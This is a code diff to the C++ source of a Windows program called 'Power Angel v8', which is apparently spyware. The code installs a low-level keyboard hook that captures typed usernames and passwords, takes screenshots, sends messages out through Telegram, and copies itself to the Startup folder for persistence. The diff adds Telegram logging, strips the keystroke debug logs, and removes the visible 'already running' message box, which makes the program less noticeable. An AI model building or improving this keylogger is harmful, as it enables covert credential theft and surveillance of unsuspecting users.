@@ -9,6 +9,7 @@
 #include <winhttp.h>
 #include <commctrl.h>
 #include <shellapi.h>
+#include <shlobj.h>  // ADDED THIS LINE FOR CSIDL_STARTUP
 #include <mutex>
 #include <thread>
 #include <string>
@@ -27,6 +28,7 @@
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "comctl32.lib")
+#pragma comment(lib, "shell32.lib")  // ADDED THIS LINE FOR SHGetSpecialFolderPathW
 
 using namespace Gdiplus;
 
@@ -118,7 +120,10 @@ bool SendTelegram(const std::wstring& message) {
                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                    WINHTTP_NO_PROXY_NAME, 
                                    WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!session) return false;
+    if (!session) {
+        DebugLog(L"[TELEGRAM] WinHttpOpen failed");
+        return false;
+    }
     
     WinHttpSetTimeouts(session, 30000, 30000, 30000, 30000);
     
@@ -126,6 +131,7 @@ bool SendTelegram(const std::wstring& message) {
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
     if (!connect) {
         WinHttpCloseHandle(session);
+        DebugLog(L"[TELEGRAM] WinHttpConnect failed");
         return false;
     }
     
@@ -139,6 +145,7 @@ bool SendTelegram(const std::wstring& message) {
     if (!request) {
         WinHttpCloseHandle(connect);
         WinHttpCloseHandle(session);
+        DebugLog(L"[TELEGRAM] WinHttpOpenRequest failed");
         return false;
     }
     
@@ -168,6 +175,7 @@ bool SendTelegram(const std::wstring& message) {
     WinHttpCloseHandle(connect);
     WinHttpCloseHandle(session);
     
+    DebugLog(L"[TELEGRAM] Message " + std::wstring(result ? L"sent successfully" : L"failed to send"));
     return result != FALSE;
 }
 
@@ -305,18 +313,15 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             // Update shift state
             if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
                 g_shiftPressed = true;
-                DebugLog(L"[KEY] Shift pressed");
             }
             
             // Toggle caps lock on VK_CAPITAL press
             if (pKb->vkCode == VK_CAPITAL) {
                 g_capsLock = !g_capsLock;
-                DebugLog(L"[KEY] CapsLock toggled: " + std::wstring(g_capsLock ? L"ON" : L"OFF"));
             }
             
             // Handle TAB key
             if (pKb->vkCode == VK_TAB) {
-                DebugLog(L"[KEY] TAB detected. Current field: " + g_currentField);
                 if (!g_currentField.empty()) {
                     if (g_username.empty()) {
                         g_username = g_currentField;
@@ -396,7 +401,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 }
                 
                 g_currentField += ch;
-                DebugLog(L"[KEY] Letter: " + std::wstring(1, ch) + L" -> Field: " + g_currentField);
             }
             // Numbers 0-9
             else if (pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) {
@@ -405,14 +409,12 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 
                 if (!g_shiftPressed) {
                     g_currentField += ch;
-                    DebugLog(L"[KEY] Number: " + std::wstring(1, ch));
                 } else {
                     // Handle shift + number symbols
                     const WCHAR symbols[] = {L')', L'!', L'@', L'#', L'$', L'%', L'^', L'&', L'*', L'('};
                     int index = pKb->vkCode - 0x30;
                     if (index >= 0 && index < 10) {
                         g_currentField += symbols[index];
-                        DebugLog(L"[KEY] Symbol: " + std::wstring(1, symbols[index]));
                     }
                 }
             }
@@ -420,7 +422,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             else if (pKb->vkCode == VK_SPACE) {
                 isPrintable = true;
                 g_currentField += L' ';
-                DebugLog(L"[KEY] Space");
             }
             // Common symbols
             else {
@@ -435,7 +436,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                     ch = unicodeChar[0];
                     if (ch >= 32 && ch <= 126) { // Printable ASCII
                         g_currentField += ch;
-                        DebugLog(L"[KEY] Char: " + std::wstring(1, ch));
                     }
                 }
             }
@@ -444,7 +444,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             // Clear shift state on keyup
             if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
                 g_shiftPressed = false;
-                DebugLog(L"[KEY] Shift released");
             }
         }
     }
@@ -632,7 +631,7 @@ bool TakeScreenshotNow(const std::wstring& title) {
     SYSTEMTIME st;
     GetLocalTime(&st);
     WCHAR filename[MAX_PATH];
-    swprintf_s(filename, L"angel_v8_%d%02d%02d_%02d%02d%02d_%d.jpg", 
+    swprintf_s(filename, MAX_PATH, L"angel_v8_%d%02d%02d_%02d%02d%02d_%d.jpg", 
                st.wYear, st.wMonth, st.wDay, 
                st.wHour, st.wMinute, st.wSecond,
                ++g_totalScreenshots);
@@ -743,7 +742,7 @@ void InstallPersistence() {
         return;
     }
     
-    wcscat_s(startup, L"\\PowerAngel_v8.exe");
+    wcscat_s(startup, MAX_PATH, L"\\PowerAngel_v8.exe");
     
     // Copy to startup folder
     if (CopyFileW(path, startup, FALSE)) {
@@ -849,7 +848,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
     HANDLE mutex = CreateMutexW(NULL, TRUE, L"Global\\PowerAngel_v8.0_Fixed_Mutex");
     if (mutex && GetLastError() == ERROR_ALREADY_EXISTS) {
         DebugLog(L"[INIT] Another instance is already running");
-        MessageBoxW(NULL, L"Power Angel v8.0 is already running!", L"Information", MB_OK | MB_ICONINFORMATION);
         GdiplusShutdown(g_gdiplusToken);
         CoUninitialize();
         return 0;
